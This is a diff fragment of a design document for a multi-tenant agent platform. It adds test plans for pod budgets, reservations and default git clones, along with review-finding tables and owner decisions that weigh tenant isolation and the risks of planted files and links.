 - The merge against base and grant, for each row of "Base changes", including an emptied set.
 - `ExperimentVariantSource`: effects reach an owned pool or a sole grantee's pool, a shared pool is untouched, and one tenant's malformed set leaves other tenants' variants applied.
 - `AdmitTenantPin` and `markPinnedIdle` across owned and shared pools, served and unserved, recycling and not.
-- Budget arithmetic at the boundary, including a raise refused at 19 active pods with `maxOwnedPods: 20`, a raise to a sum equal to the bound, a lowering that passes, warming and `sdk_connecting` pods counted once, `terminated` Sandboxes not counted, a tenant's pods on shared pools not counted, and a `ClaimSlot` on an occupied pod exempt, and the clamp on the PoolScalingController formula and `initialMinWarm`.
+- T at the bound: a claim and a write that reach it pass, and those that pass it are refused, a lowering always passes, warming and `sdk_connecting` pods are counted once, `terminated` Sandboxes are not counted, a tenant's pods on shared pools are not counted, and a `ClaimSlot` on an occupied pod leaves T unchanged. T holds across several pools, with and without reservations. The clamp on the PoolScalingController formula and `initialMinWarm`.
 - A tenant schema with a `file:` `$ref`, a non-compiling schema, and an oversized schema are refused at write.
+- Default clones: each write check refuses, including an uncovered host with a full commit, a write scope, an `auth`-less repository under a pool prefix, `submodules`, `path: .`, a `.git` component in any case, overlapping paths, and a URL with userinfo. `ComposeInto` places clones after files and ahead of client sources.
+- `plan.Compute` given a floor above `warmCount` creates up to the floor, `ForceZeroMinWarm` renders `spec.reservedPods` as 0, and a `scaleToZero` window leaves it. The warm target at `active` below, equal to, and above `reservedPods`, with `draining` and `failed` not counted, a `scaleToZero` window not lowering it, and `warm_stop_reasons` overriding it. T with a reservation: a claim within it passes at the bound even with pods draining, a `reservedPods` write that takes T past the bound is refused, and pods stay at `reservedPods + warmCount` after those claims.
 
 ### Tier 2: component
 
 - The PoolScalingController renders `podRuntimeRef` and the owner, the controller creates a pod from the base's `Runtime` resource, a missing base fails closed, and an SDK-warm base warms its owned pool as SDK-warm.
 - The webhook admits the owner label at creation and refuses every other tenant change.
+- The chart renders the split with `lenny-agent-storage-quota` unscoped, and it applies on a cluster. `lenny-agent-quota` admits a pod with no priority class under its `NotIn` scope.
+- The WarmPoolController marks Sandboxes reserved up to `reservedPods` and no further, a marked Sandbox's pod carries `lenny-reserved` and `reservedPlacement`, a replacement after a reserved pod ends is marked, unmarked idle pods drain first, and a podless unmarked Sandbox is replaced by a marked one while marks fall short. With `reservations.enabled` false, stored floors do not apply and no pod is marked.
 
 ### Tier 3: contract
 
 - The route bodies refuse unknown fields, the error codes match §15.1, and `GET /v1/admin/derived-runtimes/{name}` reports `baseStatus`.
 - `CH-SUPERVISE` carries a setup run with the DR-3 outcome reports.
+- `replacePath` survives the stored plan, the schema, the mapping to `WorkspaceSource`, and the adapter's decode, and a client's plan setting it is refused.
 
 ### Tier 4: integration
 
@@ -666,13 +860,21 @@ Each proposal turns this list into tests with `// spec:` annotations at the tier
 - Each session surface refuses a `--` name it cannot resolve, and `setupCommandPolicy.shell: false` reaches the adapter for a tenant-derived runtime.
 - A platform `PUT` and `warm-count` on an owned pool succeed. A delegation policy's deletion guard sees its own tenant's reference, and another tenant's reference neither blocks the delete nor appears in the answer.
 - A grant entry's `retireAt` moves its runtimes through retirement, an emergency write takes effect at once, and `DELETE .../tenant-access/{tenantId}` answers `409` while the entry is live. With `enabled` false, a narrowing grant write passes and a raise is refused.
+- A default clone passes through the auth binding check, the `required` check, and the commit pin on create, create-and-start, finalize, and a delegated child, and a create with no plan refuses before any claim.
+- A client `gitClone` at `path: .` materializes with a default file and a default clone present. Derive and replay refuse before the claim.
+- A grant write cannot push allowances past `totalPods`, counting live marked pods above an allowance. A lowered allowance or `maxOwnedPods` lowers `reservedPods`.
 - A `DELETE` with live sessions changes nothing. Suspension drains owned pools, and resuming restores them. Tenant deletion and erasure remove the table, grant, and pools, and a consumed prefix stays refused.
 
 ### Tier 5: end to end on Kind
 
 - A seeded install with no `tenantAccess` starts a session on its seeded runtime, and the embedded stack starts one on its CRD-only pool.
 - Decision 15's scenario: a concurrent base, an owned one-session pool, and a session with E's full policy.
+- With the general quota full, a reserved pod starts and a general pod is refused at quota admission. With nodes full and no dedicated pool, a reserved pod stays pending and no other pod is evicted.
 - Warm pods stay in inventory on an owned non-recycling pool, a served pod drains, and a recycling owned pool reuses a pod for its owner within the reserved hold and drains it afterwards. A non-empty `warm_stop_reasons` drains served idle pods.
+
+### Tier 6: end to end on cloud
+
+- Materialization on a gVisor pod opens paths under `RESOLVE_BENEATH | RESOLVE_NO_SYMLINKS` and refuses a link.
 
 ### Tier 7: load
 
@@ -696,6 +898,9 @@ Each proposal turns this list into tests with `// spec:` annotations at the tier
 - Revoking access after an experiment's write refuses its sessions and delegated children on the final row, for a runtime with no `--`. A tenant-admin's `PUT` on an experiment naming a platform pool answers `403`.
 - A flag-lowering write emits `runtime.base_changed` to a tenant with an overlay and no grant. A tenant `PUT` does not clear `warm_stop_reasons`.
 - A pod of an owned pool cannot be claimed for another tenant, even when the gateway's first layer is skipped.
+- A restored symbolic link chain, and a single link an agent wrote in the live tree, fail materialization for an `inlineFile`, `uploadFile`, clone, move, and `replacePath` removal, and nothing is written outside the slot. A default clone over a snapshot holding a planted `skills/conftest.py` leaves no such file.
+- A user with no read access on a `required` pool is refused on a default clone, the answer omits the repository name, no `ls-refs` runs, and no App token is minted. A `.git/config`, `commondir`, or hook already in a clone's target, including from a restored snapshot, runs nothing at the adapter's UID and does not survive the move. A default-clone refusal on an `off` pool for a repository made private carries no URL. A `floatingCloneRefs` forbid suspends a runtime with a branch ref. `verbatimClientFiles: forbid` refuses a default clone. An experiment's `variant.Runtime` brings its clones under the same checks.
+- A tenant with no allowance cannot set `reservedPods`, and no tenant write changes a Helm total or `reservedPlacement`.
 - An SO-2 forbid refuses a write, suspends existing runtimes, and a removal waits out the delay.
 
 ### Tier 10: conformance
@@ -802,9 +1007,57 @@ A stop check on revision 5 found no Critical, High, or Major issue in this docum
 | 5, a re-issued entry | Holds. | Applied. |
 | 6, R6 and DP9 | Holds. | Applied. |
 
+## Review of DR-9 and DR-10
+
+An independent review read revision 8 and found no path across tenants. Each finding below was checked against the text and the tree. None was rejected, and the "Result" column states where the fix differs from the one proposed. The reviewer's statements about Kubernetes behaviour come from its knowledge of upstream and were not run.
+
+| Finding | Result | Check and outcome |
+| :-- | :-- | :-- |
+| High, a stale target defeats the floor | Holds. | `defaultSyncInterval` is 30 seconds, and `plan.Compute` counts a warming pod and drains only idle ones. The target moves to the WarmPoolController, with the two rules under "Which pods are reserved". |
+| High, the quota runs out early | Holds. Fix changed. | `applyResources` stamps every container. The reserved quota limits `pods` alone, so a sizing error cannot refuse a reserved pod. |
+| High, a raised priority changes eviction | Holds. | The class value is 0. |
+| High, `.git` in a clone's target | Holds. | `validatePath` has no such check. Refused for defaults, and the egress design now requires a new directory with hooks and repository configuration ignored. |
+| Major, `auth`-less clones | Holds. | `checkGitCloneAuthBindings` skips them. Checks now key on the pool prefix. |
+| Major, refusals name the repository | Holds. | `writeRefResolveError` returns `url`. A separate writer applies, and the pinned-commit failure is stated. |
+| Major, switching off breaks pods | Holds. | The controller reads the same value, so stored floors stop applying. |
+| Major, the floor ignores other paths | Holds. | The order and the `active` definition are stated. |
+| Major, lowering `maxOwnedPods` | Holds. | Allowances are bounded across the grant and lowered first. |
+| Major, the marking race and overrun | Holds. | "No race" is withdrawn, and grant writes count overrun. |
+| Major, placement and namespaces | Holds. Fix narrowed. | Reservations stay in the one namespace the controller manages and leave Kata out. The field is renamed. |
+| Minors, wording, derive and replay, unsupported pods, and the other documents | Hold. | Applied. |
+
+A stop check then read revision 9. It found no Critical or High issue and no path across tenants. Each of its Major findings was checked against the tree, and revision 10 applies them.
+
+| Finding | Result | Check and outcome |
+| :-- | :-- | :-- |
+| Major, the floor is clamped and a pause cannot override it | Holds. | `warmTarget` clamps to `MaxWarm`, and `resolveWarm` writes the same value for both zero paths. The target is passed as both values, and `spec.reservedPods` carries the override. |
+| Major, a reserved pod can fail the budget | Holds. | The exemption now reads `claimed` and `reserved` alone, and a `reservedPods` write uses a non-strict rule. |
+| Major, the derive and replay row | Holds. | Those rows set no `WorkspacePlan`. The row is rewritten, and a default clone replaces its path over a restored tree. |
+| Major, the move merges `.git` | Holds. Introduced by revision 9's fix. | §14.1's rule is per path. `.git` is replaced as a unit, and all adapter git work comes before the move. |
+| Minors: deleting a stuck Sandbox, checks at bind, error text, the disable switch, `spec.minWarm` readers, and preflight's missing source | Hold. | Applied. Preflight no longer claims a check it has no source for. |
+
+A narrow stop check then read revision 10. It found no Critical or High issue and no path across tenants, and revision 11 applies its Major findings.
+
+| Finding | Result | Check and outcome |
+| :-- | :-- | :-- |
+| Major, the exemption breaks `maxOwnedPods` | Holds. Introduced by revision 10's fix. | The worst case is `reservedPods + warmCount`, and the write charge now covers it. |
+| Major, whole-path replacement has no carrier | Holds. | `replacePath` is added, with §7.1 and §14.1 listed. |
+| Major, the move can follow a planted link | Holds. Exists today for other writers. | `extractSymlink` and `writeInlineFile` read as stated. All materializer paths use `openat2`, and DF-15 is filed. No chain was run. |
+| Major, the quota split cannot install | Holds. | Upstream's `IsResourceQuotaScopeValidForResource` refuses ephemeral storage under this scope. Storage moves to an unscoped quota, with the residual stated. Nothing was applied to a cluster. |
+| Minors: the target's source, the `drain` route, deleting a warming Sandbox, `undoDerivedWrites`, and the lowering rule | Hold. | Applied. |
+
+A further stop check read revision 11. It found no Critical or High issue, and revision 12 applies what follows.
+
+| Finding | Result | Check and outcome |
+| :-- | :-- | :-- |
+| Major, the claim check fails across pools | Holds. Fix wider. | This is the third budget finding in a row, each from a rule added to the last. Revision 12 removes the exemption and the separate write and claim rules, and one figure, T, governs both. The worked examples were recomputed by hand. |
+| Major, `replacePath` stops at the stored plan | Holds. | `WorkspaceSource` has no such field, and the mapping is field by field. All carriers are listed, with tests. |
+| Major, `openat2` under gVisor | Rejected. | gVisor's current `linux64.go` lists `openat2` as supported on both architectures. Whether it honours both `RESOLVE` flags was not read, so a Tier 6 test stays. |
+| Minors: a single live-tree link in F-13.4.24, the §14.1 statement, the lowering row, and the chart's namespace loop | Hold. | Applied. |
+
 ## Decisions
 
-These are open for the owner, and the recommendation is the design above. The owner's choice rules out decision 4's alternative of no tenant defaults in the first version, and it leaves decision 4's grant flags and setup commands open.
+These are open for the owner, and the recommendation is the design above. The owner settled part of decision 4: tenants can define default files, setup commands, and git clones, so its alternative of no tenant defaults is gone. The grant flags that decision 4 recommends remain open.
 
 | # | Decision | Recommendation | Cost of the recommendation | Alternative |
 | :-- | :-- | :-- | :-- | :-- |
@@ -813,7 +1066,7 @@ These are open for the owner, and the recommendation is the design above. The ow
 | 3 | Raising `maxConcurrentSessions` | Lowering only | A tenant wanting higher density asks the operator to raise the template | A ceiling in the grant above the template's value, which moves the acknowledgment to the operator per tenant and adds cost per pod for a tenant wanting it |
 | 4 | Tenant defaults | Files and commands each under their own grant flag, off by default, on a supervised base, after DR-3. Commands also need `allowlist` and `shell: false`. | Where a flag is on, a stolen `tenant-admin` runs code at the agent UID in every new session on that runtime, reading `file` tokens and using `inject` tokens. DR-3 is new work. | No tenant defaults in the first version, which serves R2 and removes this cost, and leaves a tenant needing files or tools to ask an operator. Files without commands is no middle ground, because a file is code. |
 | 5 | Pool for each runtime | Always an owned pool, with no fallback | One warm pod at least per runtime, while DF-11 stands | A fallback to a non-recycling, one-session base pool, which costs no warm pods and does not serve decision 15's case |
-| 6 | Bounding capacity | `maxOwnedPods` per tenant, checked at write and claim, with the sum of grants at or below a deployment total | The bound is a pod count, the count at claim can overshoot, an operator sizes each grant up front, and the namespace `ResourceQuota` stays shared | A dedicated agent namespace for owned pools, with its own quota. That isolates capacity and needs multi-namespace work in `PoolStoreSource`, `ResolvePool`, and the chart |
+| 6 | Bounding capacity | `maxOwnedPods` per tenant, checked at write and claim, with the sum of grants at or below a deployment total | The bound is a pod count, the count at claim can overshoot, an operator sizes each grant up front, and the namespace `ResourceQuota` stays shared apart from DR-10's split | A dedicated agent namespace for owned pools, with its own quota. That isolates capacity and needs multi-namespace work in `PoolStoreSource`, `ResolvePool`, and the chart |
 | 7 | Template values | Copied, and propagated in the platform write's transaction | A platform write touches every owned row, and a widening reaches tenants at once | Read-through at each use, which needs a new merge in each reader |
 | 8 | Base retirement | A notice period of 30 days by default, with an emergency path | A platform waits on retirement, and the figure is a judgment | No notice, which strands tenants, or tenants blocking as today, which R6 refuses |
 | 9 | A delay on tenant commands at a tenant with a security record | None on create, with a forbid and an immediate event | A stolen `tenant-admin` at a tenant with no forbid has its command run until someone acts | SO-2's weakening delay on each command change, or an approved-digest list like `tokenTrust.allowedRecords`. Each is additive and slows every legitimate change |
@@ -823,3 +1076,10 @@ These are open for the owner, and the recommendation is the design above. The ow
 | 13 | Experiments on pools | A `tenant-admin` names owned pools alone and reachable runtimes, a `platform-admin` names a platform pool whose single tenant is the experiment's, and the controller applies effects under the same test | Until DR-5 a `tenant-admin`'s variant sets `variant.Runtime` alone, with no warm sizing of its own. A base pool shared with another tenant stays over-warmed during an experiment, and an operator cannot run a variant on a shared pool | Owned pools alone, which ends experiments on a deployment with no grant, or a `platform-admin` approval flag on each experiment, which the controller would have to read |
 | 14 | Overlay rows only an owned pool has | Read as `none` unless the grant entry's `ownedOverlays` lists them | An operator lists each row per base, a tenant needing its own CA or `gitAccess` asks, and a listed `clientProfile` sets only allowlisted variable names | Follow the copied flags as EG-9 states, which opens rows the operator set the flag without considering |
 | 15 | An absent `tenantAccess` on a seeded runtime or pool | Grants `default` when the seed names no tenant, the seed's tenant when it names exactly one, and none when it names several | A seed naming several tenants lists each grant, or its sessions are refused | Every seeded tenant, which is less to write and over-grants, or none, which breaks §4.2's statement that a single-tenant deployer need not think about tenants |
+| 16 | A default clone's scope | Read only | A client that pushes declares the repository in `writableRepositories` on each session | A grant flag allowing a write scope, which gives every session on the runtime a writable repository with no client statement, and can attach `prAuthoring`'s binding |
+| 17 | Floating refs on default clones | Allowed, with a `Warning`, a posture entry, and a `floatingCloneRefs` forbid | Whoever can push to the ref runs code in every new session until someone forbids it | Require a full commit, which removes that risk and makes each update a tenant admin's write |
+| 18 | Default clones on a `required` pool | Allowed, under the check on the session user's link, refusing a session whose user cannot read | A runtime can be unusable for some users, and a tenant admin chooses which repository a user's access is spent on | Refuse such clones at write, which keeps every read under a `required` pool the user's own statement and loses private default clones there. A skip for users without access changes what the runtime contains per user, so it is not recommended |
+| 19 | A default clone's location | A named subdirectory | A tenant cannot place a default repository at the workspace root | Allow `path: .`, which needs the egress design's statement on a non-empty target and makes a client's clone at `.` collide |
+| 20 | What a reservation holds | Pods that exist, a split quota, and an optional dedicated node pool, with no preemption or raised priority, in the default agent namespace | Without dedicated nodes a replacement pod can wait. The reserved share stays idle when unused, and a dedicated pool costs idle nodes | Preemption, which guarantees a place and can end other tenants' running sessions. Or low-priority placeholder pods that reserved pods preempt, which holds nodes without a dedicated pool and needs every agent pod to carry `preemptionPolicy: Never`, plus a controller or fixed count sizing the placeholders |
+| 21 | Who sets the floor | The operator sets a total, a platform admin sets each tenant's allowance per base and class, and a tenant admin divides it among its runtimes | Three settings to keep in step | A platform admin sets each pool's floor directly, which is simpler and puts an operator's action on every change |
+| 22 | A default clone over a restored tree | Replaces its `path` as a whole at a derive or replay, and a floating ref resolves afresh | An agent's changes under that path in the earlier session are lost, and a derived session can run a newer commit than its source | Keep the restored directory and skip the clone, which leaves whatever an earlier session wrote there running as trusted default content |
